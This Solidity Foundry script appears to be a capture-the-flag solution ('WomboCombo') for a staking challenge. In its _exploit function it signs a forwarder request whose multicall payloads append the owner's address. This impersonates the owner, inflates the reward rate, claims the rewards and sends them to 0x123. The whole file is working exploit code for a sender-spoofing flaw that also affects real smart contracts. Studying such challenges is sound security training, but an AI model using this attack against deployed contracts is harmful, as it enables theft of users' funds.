// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "forge-ctf/CTFSolver.sol";

import {Challenge} from "src/Challenge.sol";
import {Token} from "src/Token.sol";
import {Forwarder} from "src/Forwarder.sol";
import {Staking} from "src/Staking.sol";

contract WomboComboSolver is CTFSolver {
    Challenge private challenge;
    Staking private staking;
    Forwarder private forwarder;
    Token private stakingToken;
    Token private rewardsToken;

    address private system;
    address private player;
    uint256 playerPrivateKey =
        vm.envOr("PLAYER", uint256(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80));

    bytes32 private constant _FORWARDREQUEST_TYPEHASH = keccak256(
        "ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint256 deadline,bytes data)"
    );

    // computes the hash of the fully encoded EIP-712 message for the domain, which can be used to recover the signer
    function _getTypedDataHash(Forwarder.ForwardRequest memory _forwardRequest) private view returns (bytes32) {
        return keccak256(abi.encodePacked("\x19\x01", forwarder.DOMAIN_SEPARATOR(), _getStructHash(_forwardRequest)));
    }

    // computes the hash of a permit
    function _getStructHash(Forwarder.ForwardRequest memory _forwardRequest) private pure returns (bytes32) {
        return keccak256(
            abi.encode(
                _FORWARDREQUEST_TYPEHASH,
                _forwardRequest.from,
                _forwardRequest.to,
                _forwardRequest.value,
                _forwardRequest.gas,
                _forwardRequest.nonce,
                _forwardRequest.deadline,
                keccak256(_forwardRequest.data)
            )
        );
    }

    function solve(address _challenge, address _player) internal override {
        challenge = Challenge(_challenge);
        forwarder = Forwarder(challenge.forwarder());
        staking = Staking(challenge.staking());
        stakingToken = Token(staking.stakingToken());
        rewardsToken = Token(staking.rewardsToken());

        system = staking.owner();
        player = _player;

        _exploit();
    }

    function _exploit() private {
        // Stake 1 token for totalSupply to be equals to 1
        stakingToken.approve(address(staking), 1);
        staking.stake(1);

        // Main attack logic
        bytes memory payload1 =
            abi.encodePacked(abi.encodeWithSelector(staking.setRewardsDuration.selector, 1), address(system));
        bytes memory payload2 = abi.encodePacked(
            abi.encodeWithSelector(staking.notifyRewardAmount.selector, 100_000_000 * 10 ** 18), address(system)
        );

        bytes[] memory payloads = new bytes[](2);
        payloads[0] = payload1;
        payloads[1] = payload2;
        bytes memory multicallData = abi.encodeWithSelector(staking.multicall.selector, payloads);
        uint256 timeline = 0;
        Forwarder.ForwardRequest memory forwardRequest = Forwarder.ForwardRequest({
            from: player,
            to: address(staking),
            value: 0,
            gas: 500_000,
            nonce: forwarder.getNonce(player, timeline),
            deadline: timeline,
            data: multicallData
        });
        bytes32 digest = _getTypedDataHash(forwardRequest);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
        forwarder.execute(forwardRequest, abi.encodePacked(r, s, v));
        vm.warp(block.timestamp + 1);
        staking.getReward();
        rewardsToken.transfer(address(0x123), rewardsToken.balanceOf(player));
    }
}
